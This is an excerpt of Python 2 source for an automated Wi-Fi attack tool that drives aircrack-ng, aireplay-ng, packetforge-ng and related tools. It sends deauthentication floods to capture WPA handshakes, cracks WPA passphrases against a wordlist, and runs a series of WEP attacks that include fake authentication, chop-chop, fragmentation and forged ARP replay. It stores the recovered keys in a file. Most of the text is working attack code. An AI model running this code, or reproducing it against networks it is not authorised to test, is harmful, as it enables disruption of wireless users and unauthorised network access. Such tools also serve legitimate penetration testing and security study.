		if len(WPA_CAPS_TO_CRACK) > 0:
			options += W+', '+O+'s'+W
			print O+"     [s]kip"+W+" to cracking WPA cap files"
		options += W+', or '+R+'e'+W
		print R+"     [e]xit"+W+" completely"
		ri = ''
		while ri != 'c' and ri != 's' and ri != 'e': 
			ri = raw_input(GR+' [+]'+W+' please make a selection (%s): ' % options)
		
		if ri == 's':
			TARGETS_REMAINING = -1 # Tells start() to ignore other targets, skip to cracking
		elif ri == 'e':
			should_we_exit = True
	return should_we_exit









#################
# WPA FUNCTIONS #
#################


def wpa_get_handshake(iface, target, clients):
	"""
		Opens an airodump capture on the target, dumping to a file.
		During the capture, sends deauthentication packets to the target both as
		general deauthentication packets and specific packets aimed at connected clients.
		Waits until a handshake is captured.
			"iface"   - interface to capture on
			"target"  - Target object containing info on access point
			"clients" - List of Client objects associated with the target
		Returns True if handshake was found, False otherwise
	"""
	global TARGETS_REMAINING, WPA_ATTACK_TIMEOUT

	if WPA_ATTACK_TIMEOUT <= 0: WPA_ATTACK_TIMEOUT = -1
	
	# Generate the filename to save the .cap file as <SSID>_aa-bb-cc-dd-ee-ff.cap
	save_as = WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) \
	          + '_' + target.bssid.replace(':', '-') + '.cap'
	
	# Check if we already have a handshake for this SSID... If we do, generate a new filename
	save_index = 0
	while os.path.exists(save_as):
		save_index += 1
		save_as = WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) \
	                     + '_' + target.bssid.replace(':', '-') \
	                     + '_' + str(save_index) + '.cap'
		
	# Remove previous airodump output files (if needed)
	remove_airodump_files(temp + 'wpa')
	
	# Start of large Try-Except; used for catching keyboard interrupt (Ctrl+C)
	try:
		# Start airodump-ng process to capture handshakes
		cmd = ['airodump-ng', 
		      '-w', temp + 'wpa', 
		      '-c', target.channel, 
		      '--bssid', target.bssid, iface]
		proc_read = Popen(cmd, stdout=OUTLOG, stderr=ERRLOG)
		
		# Setting deauthentication process here to avoid errors later on
		proc_deauth = None
		
		print ' %s starting %swpa handshake capture%s on "%s"' % \
		        (GR+sec_to_hms(WPA_ATTACK_TIMEOUT)+W, G, W, G+target.ssid+W)
		got_handshake = False
		
		seconds_running = 0
		
		target_clients = clients[:]
		client_index = -1
		
		# Deauth and check-for-handshake loop
		while not got_handshake and (WPA_ATTACK_TIMEOUT <= 0 or seconds_running < WPA_ATTACK_TIMEOUT):
			
			time.sleep(1)
			seconds_running += 1
			
			print "                                                          \r",
			print ' %s listening for handshake...\r' % \
			      (GR+sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running)+W),
			stdout.flush()
			
			if seconds_running % WPA_DEAUTH_TIMEOUT == 0: 
				# Send deauth packets via aireplay-ng
				cmd = ['aireplay-ng',
				       '--ignore-negative-one',
				      '-0',  # Attack method (Deauthentication)
				       str(WPA_DEAUTH_COUNT),  # Number of packets to send
				      '-a', target.bssid]
				
				client_index += 1
				
				if client_index == -1 or len(target_clients) == 0 or client_index >= len(target_clients):
					print " %s sending %s deauth to %s*broadcast*%s..." % \
					         (GR+sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running)+W, G+str(WPA_DEAUTH_COUNT)+W, G, W),
					client_index = -1
				else:
					print " %s sending %s deauth to %s... " % \
					         (GR+sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running)+W, \
						 G+str(WPA_DEAUTH_COUNT)+W, \
					         G+target_clients[client_index].bssid+W),
					cmd.append('-h')
					cmd.append(target_clients[client_index].bssid)
				cmd.append(iface)
				stdout.flush()
				
				# Send deauth packets via aireplay, wait for them to complete.
				proc_deauth = Popen(cmd, stdout=OUTLOG, stderr=ERRLOG)
				proc_deauth.wait()
				print "sent\r",
				stdout.flush()
			
			# Copy current dump file for consistency
			if not os.path.exists(temp + 'wpa-01.cap'): continue
			copy(temp + 'wpa-01.cap', temp + 'wpa-01.cap.temp')
			
			# Save copy of cap file (for debugging)
			#remove_file('/root/new/wpa-01.cap')
			#copy(temp + 'wpa-01.cap', '/root/new/wpa-01.cap')
			
			# Check for handshake
			if has_handshake(target, temp + 'wpa-01.cap.temp'):
				got_handshake = True
				
				try: os.mkdir(WPA_HANDSHAKE_DIR + os.sep)
				except OSError: pass
				
				# Kill the airodump and aireplay processes
				send_interrupt(proc_read)
				send_interrupt(proc_deauth)
				
				# Save a copy of the handshake
				rename(temp + 'wpa-01.cap.temp', save_as)
				
				print '\n %s %shandshake captured%s! saved as "%s"' % \
						(GR+sec_to_hms(WPA_ATTACK_TIMEOUT-seconds_running)+W, G, W, G+save_as+W)
				WPA_FINDINGS.append('%s (%s) handshake captured' % (target.ssid, target.bssid))
				WPA_FINDINGS.append('saved as %s' % (save_as))
				WPA_FINDINGS.append('')
				
				# Strip handshake if needed
				if WPA_STRIP_HANDSHAKE: strip_handshake(save_as)
				
				# Add the filename and SSID to the list of 'to-crack'
				# Cracking will be handled after all attacks are finished.
				WPA_CAPS_TO_CRACK.append(CapFile(save_as, target.ssid, target.bssid))
				
				break # Break out of while loop
				
			# No handshake yet
			os.remove(temp + 'wpa-01.cap.temp')
			
			# Check the airodump output file for new clients
			for client in parse_csv(temp + 'wpa-01.csv')[1]:
				if client.station != target.bssid: continue
				new_client = True
				for c in target_clients:
					if client.bssid == c.bssid: 
						new_client = False
						break
				
				if new_client:
					print " %s %snew client%s found: %s                         " % \
					       (GR+sec_to_hms(WPA_ATTACK_TIMEOUT - seconds_running)+W, G, W, \
					       G+client.bssid+W)
					target_clients.append(client)
			
		# End of Handshake wait loop.
		
		if not got_handshake:
			print R+' [0:00:00]'+O+' unable to capture handshake in time'+W
	
	except KeyboardInterrupt: 
		print R+'\n (^C)'+O+' WPA handshake capture interrupted'+W
		if attack_interrupted_prompt():
			remove_airodump_files(temp + 'wpa')
			send_interrupt(proc_read)
			send_interrupt(proc_deauth)
			print ''
			exit_gracefully(0)
			

	# clean up
	remove_airodump_files(temp + 'wpa')
	send_interrupt(proc_read)
	send_interrupt(proc_deauth)
	
	return got_handshake

def has_handshake_tshark(target, capfile):
	"""
		Uses TShark to check for a handshake.
		Returns "True" if handshake is found, false otherwise.
	"""
	if program_exists('tshark'):
		# Call Tshark to return list of EAPOL packets in cap file.
		cmd = ['tshark',
		       '-r', capfile, # Input file
		       '-R', 'eapol', # Filter (only EAPOL packets)
		       '-n']          # Do not resolve names (MAC vendors)
		proc = Popen(cmd, stdout=PIPE, stderr=ERRLOG)
		proc.wait()
		lines = proc.communicate()[0].split('\n')
		
		# Get list of all clients in cap file
		clients = []
		for line in lines:
			if line.find('appears to have been cut short') != -1 or line.find('Running as user "root"') != -1 or line.strip() == '':
				continue
			
			while line.startswith(' '):  line = line[1:]
			while line.find('  ') != -1: line = line.replace('  ', ' ')
			
			fields = line.split(' ')
			src = fields[2].lower()
			dst = fields[4].lower()
			
			if src == target.bssid.lower() and clients.count(dst) == 0: clients.append(dst)
			elif dst == target.bssid.lower() and clients.count(src) == 0: clients.append(src)
		
		# Check each client for a handshake
		for client in clients:
			msg_num = 1 # Index of message in 4-way handshake (starts at 1)
			
			for line in lines:
				if line.find('appears to have been cut short') != -1: continue
				if line.find('Running as user "root"') != -1: continue
				if line.strip() == '': continue
				
				# Sanitize tshark's output, separate into fields
				while line[0] == ' ': line = line[1:]
				while line.find('  ') != -1: line = line.replace('  ', ' ')
				
				fields = line.split(' ')
				
				# Sometimes tshark doesn't display the full header for "Key (msg 3/4)" on the 3rd handshake.
				# This catches this glitch and fixes it.
				if len(fields) < 8: 
					continue
				elif len(fields) == 8:
					fields.append('(msg')
					fields.append('3/4)')
				
				src = fields[2].lower() # Source MAC address
				dst = fields[4].lower() # Destination MAC address
				#msg = fields[9][0]      # The message number (1, 2, 3, or 4)
				msg = fields[-1][0]
				
				# First, third msgs in 4-way handshake are from the target to client
				if msg_num % 2 == 1 and (src != target.bssid.lower() or dst != client): continue
				# Second, fourth msgs in 4-way handshake are from client to target
				elif msg_num % 2 == 0 and (dst != target.bssid.lower() or src != client): continue
				
				# The messages must appear in sequential order.
				try:
					if int(msg) != msg_num: continue
				except ValueError: continue
				
				msg_num += 1
				
				# We need the first 4 messages of the 4-way handshake
				# Although aircrack-ng cracks just fine with only 3 of the messages...
				if msg_num >= 4:
					return True
	return False

def has_handshake_cowpatty(target, capfile, nonstrict=True):
	"""
		Uses cowpatty to check for a handshake.
		Returns "True" if handshake is found, false otherwise.
	"""
	if not program_exists('cowpatty'): return False
	
	# Call cowpatty to check if capfile contains a valid handshake.
	cmd = ['cowpatty',
	       '-r', capfile,     # input file
	       '-s', target.ssid, # SSID
	       '-c']              # Check for handshake
	# Uses frames 1, 2, or 3 for key attack
	if nonstrict: cmd.append('-2')
	proc = Popen(cmd, stdout=PIPE, stderr=ERRLOG)
	proc.wait()
	response = proc.communicate()[0]
	if response.find('incomplete four-way handshake exchange') != -1:
		return False
	elif response.find('Unsupported or unrecognized pcap file.') != -1:
		return False
	elif response.find('Unable to open capture file: Success') != -1:
		return False
	return True

def has_handshake_pyrit(target, capfile):
	"""
		Uses pyrit to check for a handshake.
		Returns "True" if handshake is found, false otherwise.
	"""
	if not program_exists('pyrit'): return False
	
	# Call pyrit to "Analyze" the cap file's handshakes.
	cmd = ['pyrit',
	       '-r', capfile,
	       'analyze']
	proc = Popen(cmd, stdout=PIPE, stderr=ERRLOG)
	proc.wait()
	hit_essid = False
	for line in proc.communicate()[0].split('\n'):
		# Iterate over every line of output by Pyrit
		if line == '' or line == None: continue
		if line.find("AccessPoint") != -1:
			hit_essid = (line.find("('" + target.ssid + "')") != -1) and \
			            (line.lower().find(target.bssid.lower()) != -1)
			#hit_essid = (line.lower().find(target.bssid.lower()))
		
		else:
			# If Pyrit says it's good or workable, it's a valid handshake.
			if hit_essid and (line.find(', good, ') != -1 or \
			                  line.find(', workable, ') != -1):
				                # or line.find(', bad, ') != -1):
				return True
	return False

def has_handshake_aircrack(target, capfile):
	"""
		Uses aircrack-ng to check for handshake.
		Returns True if found, False otherwise.
	"""
	if not program_exists('aircrack-ng'): return False
	crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + target.bssid + ' ' + capfile
	proc_crack = Popen(crack, stdout=PIPE, stderr=ERRLOG, shell=True)
	proc_crack.wait()
	txt = proc_crack.communicate()[0]
	
	return (txt.find('Passphrase not in dictionary') != -1)

def has_handshake(target, capfile):
	"""
		Checks if .cap file contains a handshake.
		Returns True if handshake is found, False otherwise.
	"""
	valid_handshake = True
	tried = False
	if WPA_HANDSHAKE_TSHARK:
		tried = True
		valid_handshake = has_handshake_tshark(target, capfile)
	
	if valid_handshake and WPA_HANDSHAKE_COWPATTY:
		tried = True
		valid_handshake = has_handshake_cowpatty(target, capfile)
	
	# Use CowPatty to check for handshake.
	if valid_handshake and WPA_HANDSHAKE_COWPATTY:
		tried = True
		valid_handshake = has_handshake_cowpatty(target, capfile)
		
	# Check for handshake using Pyrit if applicable
	if valid_handshake and WPA_HANDSHAKE_PYRIT:
		tried = True
		valid_handshake = has_handshake_pyrit(target, capfile)
	
	# Check for handshake using aircrack-ng
	if valid_handshake and WPA_HANDSHAKE_AIRCRACK:
		tried = True
		valid_handshake = has_handshake_aircrack(target, capfile)
	
	if tried: return valid_handshake
	print R+' [!]'+O+' unable to check for handshake: all handshake options are disabled!'
	exit_gracefully(1)


def strip_handshake(capfile):
	"""
		Uses Tshark or Pyrit to strip all non-handshake packets from a .cap file
		File in location 'capfile' is overwritten!
	"""
	output_file = capfile
	if program_exists('pyrit'):
		cmd = ['pyrit',
		     '-r', capfile,
		     '-o', output_file,
		     'strip']
		call(cmd,stdout=OUTLOG, stderr=ERRLOG)
		
	elif program_exists('tshark'):
		# strip results with tshark
		cmd = ['tshark',
		       '-r', capfile,      # input file
		       '-R', 'eapol || wlan_mgt.tag.interpretation', # filter
		       '-w', capfile + '.temp'] # output file
		proc_strip = call(cmd, stdout=OUTLOG, stderr=ERRLOG)
		
		rename(capfile + '.temp', output_file)
		
	else:
		print R+" [!]"+O+" unable to strip .cap file: neither pyrit nor tshark were found"+W


def save_cracked(bssid, ssid, key, encryption):
	"""
		Saves cracked access point key and info to a file.
	"""
	sep = chr(0)
	fout = open('cracked.txt', 'a')
	fout.write(bssid + sep + ssid + sep + key + sep + encryption + '\n')
	fout.flush()
	fout.close()


def load_cracked():
	"""
		Loads info about cracked access points into list, returns list.
	"""
	result = []
	if not os.path.exists('cracked.txt'): return result
	fin = open('cracked.txt', 'r')
	lines = fin.read().split('\n')
	fin.close()
	
	for line in lines:
		fields = line.split(chr(0))
		if len(fields) <= 3: continue
		tar = Target(fields[0], '', '', '', fields[3], fields[1])
		tar.key = fields[2]
		result.append(tar)
	return result


##########################
# WPA CRACKING FUNCTIONS #
##########################

def wpa_crack(capfile):
	"""
		Cracks cap file using aircrack-ng
		This is crude and slow. If people want to crack using pyrit or cowpatty or oclhashcat,
		they can do so manually.
	"""
	if WPA_DICTIONARY == '':
		print R+' [!]'+O+' no WPA dictionary found! use -dict <file> command-line argument'+W
		return False

	print GR+' [0:00:00]'+W+' cracking %s with %s' % (G+capfile.ssid+W, G+'aircrack-ng'+W)
	start_time = time.time()
	cracked = False
	
	remove_file(temp + 'out.out')
	remove_file(temp + 'wpakey.txt')
	
	cmd = ['aircrack-ng',
	       '-a', '2',                 # WPA crack
	       '-w', WPA_DICTIONARY,      # Wordlist
	       '-l', temp + 'wpakey.txt', # Save key to file
	       '-b', capfile.bssid,       # BSSID of target
	       capfile.filename]
	
	proc = Popen(cmd, stdout=open(temp + 'out.out', 'a'), stderr=ERRLOG)
	try:
		kt  = 0 # Keys tested
		kps = 0 # Keys per second
		while True: 
			time.sleep(1)
			
			if proc.poll() != None: # aircrack stopped
				if os.path.exists(temp + 'wpakey.txt'):
					# Cracked
					inf = open(temp + 'wpakey.txt')
					key = inf.read().strip()
					inf.close()
					WPA_FINDINGS.append('cracked wpa key for "%s" (%s): "%s"' % (G+capfile.ssid+W, G+capfile.bssid+W, C+key+W))
					WPA_FINDINGS.append('')
					
					save_cracked(capfile.bssid, capfile.ssid, key, 'WPA')

					print GR+'\n [+]'+W+' cracked %s (%s)!' % (G+capfile.ssid+W, G+capfile.bssid+W)
					print GR+' [+]'+W+' key:    "%s"\n' % (C+key+W)
					cracked = True
				else:
					# Did not crack
					print R+'\n [!]'+R+'crack attempt failed'+O+': passphrase not in dictionary'+W
				break
			
			inf = open(temp + 'out.out', 'r')
			lines = inf.read().split('\n')
			inf.close()
			outf = open(temp + 'out.out', 'w')
			outf.close()
			for line in lines:
				i = line.find(']')
				j = line.find('keys tested', i)
				if i != -1 and j != -1:
					kts = line[i+2:j-1]
					try: kt = int(kts)
					except ValueError: pass
				i = line.find('(')
				j = line.find('k/s)', i)
				if i != -1 and j != -1:
					kpss = line[i+1:j-1]
					try: kps = float(kpss)
					except ValueError: pass
			
			print "\r %s %s keys tested (%s%.2f keys/sec%s)   " % \
			       (GR+sec_to_hms(time.time() - start_time)+W, G+add_commas(kt)+W, G, kps, W),
			stdout.flush()
			
	except KeyboardInterrupt: print R+'\n (^C)'+O+' WPA cracking interrupted'+W
	
	send_interrupt(proc)
	try: os.kill(proc.pid, SIGTERM)
	except OSError: pass
	
	return cracked

def add_commas(n):
	"""
		Receives integer n, returns string representation of n with commas in thousands place.
		I'm sure there's easier ways of doing this... but meh.
	"""
	strn = str(n)
	lenn = len(strn)
	i = 0
	result = ''
	while i < lenn:
		if (lenn - i) % 3 == 0 and i != 0: result += ','
		result += strn[i]
		i += 1
	return result












#################
# WEP FUNCTIONS #
#################


def attack_wep(iface, target, clients):
	"""
		Attacks WEP-encrypted network.
		Returns True if key was successfully found, False otherwise.
	"""
	global WEP_TIMEOUT, TARGETS_REMAINING
	if WEP_TIMEOUT <= 0: WEP_TIMEOUT = -1
	
	total_attacks = 6 # 4 + (2 if len(clients) > 0 else 0)
	if not WEP_ARP_REPLAY: total_attacks -= 1
	if not WEP_CHOPCHOP:   total_attacks -= 1
	if not WEP_FRAGMENT:   total_attacks -= 1
	if not WEP_CAFFELATTE: total_attacks -= 1
	if not WEP_P0841:      total_attacks -= 1
	if not WEP_HIRTE:      total_attacks -= 1
	
	if total_attacks <= 0:
		print R+' [!]'+O+' unable to initiate WEP attacks: no attacks are selected!'
		return False
	remaining_attacks = total_attacks
	
	print ' %s preparing attack "%s" (%s)' % \
	           (GR+sec_to_hms(WEP_TIMEOUT)+W, G+target.ssid+W, G+target.bssid+W)
	
	interrupted_count = 0
	
	remove_airodump_files(temp + 'wep')
	remove_file(temp + 'wepkey.txt')
	
	# Start airodump process to capture packets
	cmd_airodump = ['airodump-ng',
	       '-w', temp + 'wep',      # Output file name (wep-01.cap, wep-01.csv)
	       '-c', target.channel,    # Wireless channel
	       '--bssid', target.bssid,
	       iface]
	proc_airodump = Popen(cmd_airodump, stdout=OUTLOG, stderr=ERRLOG)
	proc_aireplay = None
	proc_aircrack = None
	
	successful       = False # Flag for when attack is successful
	started_cracking = False # Flag for when we have started aircrack-ng
	client_mac       = ''    # The client mac we will send packets to/from
	
	total_ivs = 0
	ivs = 0
	last_ivs = 0
	for attack_num in xrange(0, 6):
		
		# Skip disabled attacks
		if   attack_num == 0 and not WEP_ARP_REPLAY: continue
		elif attack_num == 1 and not WEP_CHOPCHOP:   continue
		elif attack_num == 2 and not WEP_FRAGMENT:   continue
		elif attack_num == 3 and not WEP_CAFFELATTE: continue
		elif attack_num == 4 and not WEP_P0841:      continue
		elif attack_num == 5 and not WEP_HIRTE:      continue
		
		remaining_attacks -= 1
		
		try:
			
			if wep_fake_auth(iface, target, sec_to_hms(WEP_TIMEOUT)):
				# Successful fake auth
				client_mac = THIS_MAC
			elif not WEP_IGNORE_FAKEAUTH: 
				send_interrupt(proc_aireplay)
				send_interrupt(proc_airodump)
				print R+' [!]'+O+' unable to fake-authenticate with target'
				print R+' [!]'+O+' to skip this speed bump, select "ignore-fake-auth" at command-line'
				return False
			
			remove_file(temp + 'arp.cap')
			# Generate the aireplay-ng arguments based on attack_num and other params
			cmd = get_aireplay_command(iface, attack_num, target, clients, client_mac)
			if cmd == '': continue
			proc_aireplay = Popen(cmd, stdout=OUTLOG, stderr=ERRLOG)
			
			print '\r %s attacking "%s" via' % (GR+sec_to_hms(WEP_TIMEOUT)+W, G+target.ssid+W),
			if attack_num == 0:   print G+'arp-replay',
			elif attack_num == 1: print G+'chop-chop',
			elif attack_num == 2: print G+'fragmentation',
			elif attack_num == 3: print G+'caffe-latte',
			elif attack_num == 4: print G+'p0841',
			elif attack_num == 5: print G+'hirte',
			print 'attack'+W
			
			print ' %s captured %s%d%s ivs @ %s iv/sec' % (GR+sec_to_hms(WEP_TIMEOUT)+W, G, total_ivs, W, G+'0'+W),
			stdout.flush()
			
			time.sleep(1)
			if attack_num == 1:
				# Send a deauth packet to broadcast and all clients *just because!*
				wep_send_deauths(iface, target, clients)
			last_deauth = time.time()
			
			replaying = False
			time_started = time.time()
			while time.time() - time_started < WEP_TIMEOUT:
				# time.sleep(5)
				for time_count in xrange(0, 6):
					if WEP_TIMEOUT == -1:
						current_hms = "[endless]"
					else: 
						current_hms = sec_to_hms(WEP_TIMEOUT - (time.time() - time_started))
					print "\r %s\r" % (GR+current_hms+W),
					stdout.flush()
					time.sleep(1)
					
				# Calculates total seconds remaining
				
				# Check number of IVs captured
				csv = parse_csv(temp + 'wep-01.csv')[0]
				if len(csv) > 0:
					ivs = int(csv[0].data)
					print "\r                                                   ",
					print "\r %s captured %s%d%s ivs @ %s%d%s iv/sec" % \
					          (GR+current_hms+W, G, total_ivs + ivs, W, G, (ivs - last_ivs) / 5, W),
					
					if ivs - last_ivs == 0 and time.time() - last_deauth > 30:
						print "\r %s deauthing to generate packets..." % (GR+current_hms+W),
						wep_send_deauths(iface, target, clients)
						print "done\r",
						last_deauth = time.time()
					
					last_ivs = ivs
					stdout.flush()
					if total_ivs + ivs >= WEP_CRACK_AT_IVS and not started_cracking:
						# Start cracking
						cmd = ['aircrack-ng',
						       '-a', '1',
						       '-l', temp + 'wepkey.txt']
						       #temp + 'wep-01.cap']
						# Append all .cap files in temp directory (in case we are resuming)
						for file in os.listdir(temp):
							if file.startswith('wep-') and file.endswith('.cap'):
								cmd.append(temp + file)

						print "\r %s started %s (%sover %d ivs%s)" % (GR+current_hms+W, G+'cracking'+W, G, WEP_CRACK_AT_IVS, W)
						proc_aircrack = Popen(cmd, stdout=OUTLOG, stderr=ERRLOG)
						started_cracking = True
				
				# Check if key has been cracked yet.
				if os.path.exists(temp + 'wepkey.txt'):
					# Cracked!
					infile = open(temp + 'wepkey.txt', 'r')
					key = infile.read().replace('\n', '')
					infile.close()
					print '\n\n %s %s %s (%s)! key: "%s"' % (current_hms, G+'cracked', target.ssid+W, G+target.bssid+W, C+key+W)
					WEP_FINDINGS.append('cracked %s (%s), key: "%s"' % (target.ssid, target.bssid, key))
					WEP_FINDINGS.append('')
					
					save_cracked(target.bssid, target.ssid, key, 'WEP')
					
					# Kill processes
					send_interrupt(proc_airodump)
					send_interrupt(proc_aireplay)
					try: os.kill(proc_aireplay, SIGTERM)
					except: pass
					send_interrupt(proc_aircrack)
					# Remove files generated by airodump/aireplay/packetforce
					time.sleep(0.5)
					remove_airodump_files(temp + 'wep')
					remove_file(temp + 'wepkey.txt')
					return True
				
				# Check if aireplay is still executing
				if proc_aireplay.poll() == None: 
					if replaying: print ', '+G+'replaying         \r'+W,
					elif attack_num == 1 or attack_num == 2: print ', waiting for packet    \r',
					stdout.flush()
					continue
				
				# At this point, aireplay has stopped
				if attack_num != 1 and attack_num != 2:
					print '\r %s attack failed: %saireplay-ng exited unexpectedly%s' % (R+current_hms, O, W)
					break # Break out of attack's While loop
				
				# Check for a .XOR file (we expect one when doing chopchop/fragmentation
				xor_file = ''
				for filename in sorted(os.listdir(temp)):
					if filename.lower().endswith('.xor'): xor_file = temp + filename
				if xor_file == '':
					print '\r %s attack failed: %sunable to generate keystream        %s' % (R+current_hms, O, W)
					break
				
				remove_file(temp + 'arp.cap')
				cmd = ['packetforge-ng',
					     '-0',
					     '-a', targets.bssid,
					     '-h', client_mac,
					     '-k', '192.168.1.2',
					     '-l', '192.168.1.100',
					     '-y', xor_file,
					     '-w', temp + 'arp.cap',
					     iface]
				proc_pforge = Popen(cmd, stdout=PIPE, stderr=ERRLOG)
				proc_pforge.wait()
				forged_packet = proc_pforge.communicate()[0]
				remove_file(xor_file)
				if forged_packet == None: result = ''
				forged_packet = forged_packet.strip()
				if not forged_packet.find('Wrote packet'):
					print "\r %s attack failed: unable to forget ARP packet               %s" % (R+current_hms+O, w)
					break
				
				# We were able to forge a packet, so let's replay it via aireplay-ng
				cmd = ['aireplay-ng',
				       '--ignore-negative-one',
				       '--arpreplay',
				       '-b', target.bssid,
				       '-r', temp + 'arp.cap', # Used the forged ARP packet
				       '-F', # Select the first packet
				       iface]
				proc_aireplay = Popen(cmd, stdout=OUTLOG, stderr=ERRLOG)
				
				print '\r %s forged %s! %s...         ' % (GR+current_hms+W, G+'arp packet'+W, G+'replaying'+W)
				replaying = True
		
			# After the attacks, if we are already cracking, wait for the key to be found!
			while started_cracking: # ivs > WEP_CRACK_AT_IVS:
				time.sleep(5)
				# Check number of IVs captured
				csv = parse_csv(temp + 'wep-01.csv')[0]
				if len(csv) > 0:
					ivs = int(csv[0].data)
					print GR+" [endless]"+W+" captured %s%d%s ivs, iv/sec: %s%d%s  \r" % \
											 (G, total_ivs + ivs, W, G, (ivs - last_ivs) / 5, W),
					last_ivs = ivs
					stdout.flush()
				
				# Check if key has been cracked yet.
				if os.path.exists(temp + 'wepkey.txt'):
					# Cracked!
					infile = open(temp + 'wepkey.txt', 'r')
					key = infile.read().replace('\n', '')
					infile.close()
					print GR+'\n\n [endless] %s %s (%s)! key: "%s"' % (G+'cracked', target.ssid+W, G+target.bssid+W, C+key+W)
					WEP_FINDINGS.append('cracked %s (%s), key: "%s"' % (target.ssid, target.bssid, key))
					WEP_FINDINGS.append('')
					
					save_cracked(target.bssid, target.ssid, key, 'WEP')
					
					# Kill processes
					send_interrupt(proc_airodump)
					send_interrupt(proc_aireplay)
					send_interrupt(proc_aircrack)
					# Remove files generated by airodump/aireplay/packetforce
					remove_airodump_files(temp + 'wep')
					remove_file(temp + 'wepkey.txt')
					return True
			
		# Keyboard interrupt during attack
		except KeyboardInterrupt:
			print R+'\n (^C)'+O+' WEP attack interrupted\n'+W
			
			send_interrupt(proc_airodump)
			if proc_aireplay != None:
				send_interrupt(proc_aireplay)
			if proc_aircrack != None:
				send_interrupt(proc_aircrack)
			
			options = []
			selections = []
			if remaining_attacks > 0:
				options.append('%scontinue%s attacking this target (%d remaining WEP attack%s)' % \
										(G, W, (remaining_attacks), 's' if remaining_attacks != 1 else ''))
				selections.append(G+'c'+W)
				
			if TARGETS_REMAINING > 0:
				options.append('%sskip%s     this target, move onto next target (%d remaining target%s)' % \
										(O, W, TARGETS_REMAINING, 's' if TARGETS_REMAINING != 1 else ''))
				selections.append(O+'s'+W)
				
			options.append('%sexit%s     the program completely' % (R, W))
			selections.append(R+'e'+W)
			
			if len(options) > 1:
				# Ask user what they want to do, Store answer in "response"
				print GR+' [+]'+W+' what do you want to do?'
				response = ''
				while response != 'c' and response != 's' and response != 'e':
					for option in options:
						print '     %s' % option
					response = raw_input(GR+' [+]'+W+' please make a selection (%s): ' % (', '.join(selections))).lower()[0]
			else:
				response = 'e'
			
			if response == 'e' or response == 's':
				# Exit or skip target (either way, stop this attack)
				if WEP_SAVE:
					# Save packets
					save_as = re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '_' + target.bssid.replace(':', '-') + '.cap'+W
					try:            rename(temp + 'wep-01.cap', save_as)
					except OSError: print R+' [!]'+O+' unable to save capture file!'+W
					else:           print GR+' [+]'+W+' packet capture '+G+'saved'+W+' to '+G+save_as+W
				
				# Remove files generated by airodump/aireplay/packetforce
				for filename in os.listdir('.'):
					if filename.startswith('replay_arp-') and filename.endswith('.cap'):
						remove_file(filename)
				remove_airodump_files(temp + 'wep')
				remove_file(temp + 'wepkey.txt')
				print ''
				if response == 'e':
					exit_gracefully(0)
				return
				
			elif response == 'c':
				# Continue attacks
				# Need to backup temp/wep-01.cap and remove airodump files
				i = 2
				while os.path.exists(temp + 'wep-' + str(i) + '.cap'):
					i += 1
				copy(temp + "wep-01.cap", temp + 'wep-' + str(i) + '.cap')
				remove_airodump_files(temp + 'wep')
				
				# Need to restart airodump-ng, as it's been interrupted/killed
				proc_airodump = Popen(cmd_airodump, stdout=OUTLOG, stderr=ERRLOG)
				
				# Say we haven't started cracking yet, so we re-start if needed.
				started_cracking = False
				
				# Reset IVs counters for proper behavior
				total_ivs += ivs
				ivs = 0
				last_ivs = 0
				
				# Also need to remember to crack "temp/*.cap" instead of just wep-01.cap
				pass
			
		
	if successful:
		print GR+'\n [0:00:00]'+W+' attack complete: '+G+'success!'+W
	else:
		print GR+'\n [0:00:00]'+W+' attack complete: '+R+'failure'+W
	
	send_interrupt(proc_airodump)
	if proc_aireplay != None:
		send_interrupt(proc_aireplay)
	
	# Remove files generated by airodump/aireplay/packetforce
	for filename in os.listdir('.'):
		if filename.startswith('replay_arp-') and filename.endswith('.cap'):
			remove_file(filename)
	remove_airodump_files(temp + 'wep')
	remove_file(temp + 'wepkey.txt')


def wep_fake_auth(iface, target, time_to_display):
	"""
		Attempt to (falsely) authenticate with a WEP access point.
		Gives 3 seconds to make each 5 authentication attempts.
		Returns True if authentication was successful, False otherwise.
	"""
	max_wait = 3 # Time, in seconds, to allow each fake authentication
	max_attempts = 5 # Number of attempts to make
	
	for fa_index in xrange(1, max_attempts + 1):
		print '\r                                                            ',
		print '\r %s attempting %sfake authentication%s (%d/%d)... ' % \
		       (GR+time_to_display+W, G, W, fa_index, max_attempts),
		stdout.flush()
		
		cmd = ['aireplay-ng',
		       '--ignore-negative-one',
		       '-1', '0', # Fake auth, no delay
		       '-a', target.bssid,
		       '-T', '1'] # Make 1 attempt
		if target.ssid != '':
			cmd.append('-e')
			cmd.append(target.ssid)
		cmd.append(iface)
		
		proc_fakeauth = Popen(cmd, stdout=PIPE, stderr=ERRLOG)
		started = time.time()
		while proc_fakeauth.poll() == None and time.time() - started <= max_wait: pass
		if time.time() - started > max_wait:
			send_interrupt(proc_fakeauth)
			print R+'failed'+W,
			stdout.flush()
			time.sleep(0.5)
			continue
		
		result = proc_fakeauth.communicate()[0].lower()
		if result.find('switching to shared key') != -1 or \
			 result.find('rejects open system'): pass
			 # TODO Shared Key Authentication (SKA)
		if result.find('association successful') != -1:
			print G+'success!'+W
			return True
		
		print R+'failed'+W,
		stdout.flush()
		time.sleep(0.5)
		continue
	print ''
	return False
	

def get_aireplay_command(iface, attack_num, target, clients, client_mac):
	"""
		Returns aireplay-ng command line arguments based on parameters.
	"""
	cmd = ''
	if attack_num == 0:
		cmd = ['aireplay-ng',
		       '--ignore-negative-one',
		       '--arpreplay',
		       '-b', target.bssid,
		       '-x', str(WEP_PPS)] # Packets per second
		if client_mac != '': 
			cmd.append('-h')
			cmd.append(client_mac)
		elif len(clients) > 0: 
			cmd.append('-h')
			cmd.append(clients[0].bssid)
		cmd.append(iface)
		
	elif attack_num == 1:
		cmd = ['aireplay-ng',
		       '--ignore-negative-one',
		       '--chopchop',
		       '-b', target.bssid,
		       '-x', str(WEP_PPS), # Packets per second
		       '-m', '60', # Minimum packet length (bytes)
		       '-n', '82', # Maxmimum packet length
		       '-F'] # Automatically choose the first packet
		if client_mac != '': 
			cmd.append('-h')
			cmd.append(client_mac)
		elif len(clients) > 0: 
			cmd.append('-h')
			cmd.append(clients[0].bssid)
		cmd.append(iface)
		
